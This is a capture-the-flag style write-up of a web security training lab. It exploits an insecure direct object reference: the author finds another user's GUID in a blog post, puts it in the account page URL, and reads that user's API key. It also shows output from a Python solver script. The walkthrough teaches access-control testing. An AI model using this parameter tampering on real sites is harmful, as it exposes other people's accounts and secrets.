# Lab: User ID controlled by request parameter, with unpredictable user IDs

### Instructions

This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.

To solve the lab, find the GUID for `carlos`, then submit his API key as the solution.

You can log in to your own account using the following credentials: `wiener:peter`

### Solution

Logging into the app we find we have a long string for our user id:

```
https://0af600fa0354650280bb4987006a0021.web-security-academy.net/my-account?id=1aeb8e09-5e5a-4845-a833-842fb00c0ff0
```

Looking at te various blog posts, we find an entry made by carlos:

```
Wellness

carlos | 22 June 2026
```

Clicking on carlos user we find his id:

```
https://0ae9002804f3f55e8144c0b100d80051.web-security-academy.net/blogs?userId=203b616d-ef39-4a05-acc1-164eb286ea6b
```

Knowing this, we can update the `my-account` id to:

```
https://0ae9002804f3f55e8144c0b100d80051.web-security-academy.net/my-account?id=203b616d-ef39-4a05-acc1-164eb286ea6b
```

```
My Account

Your username is: carlos
Your API Key is: b9POta56NTM1AYpBbVJZDB8do5RTvWWe
```

We can submit this API key, which solves the lab.

### Python Solution

See `access_control_06.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Access_Control/Access_Control_06_user_id_controlled_by_request_parameter_with_unpredictable_user_ids]
└─$ python access_control_06.py https://0a65001004b7f26d9fdd82c600ad0062.web-security-academy.net/
[+] Logged in as wiener
[*] Searching blog posts for Carlos' GUID...
[+] Carlos GUID found: 8e0da3ff-4377-49a0-aef0-17538a7548af
[*] Retrieving Carlos' API key...
[+] Carlos' API key is: VpDV0AjgVLkLpdBxnZimKqxKVjITXahK
[*] Submitting answer...
[+] Lab solved
```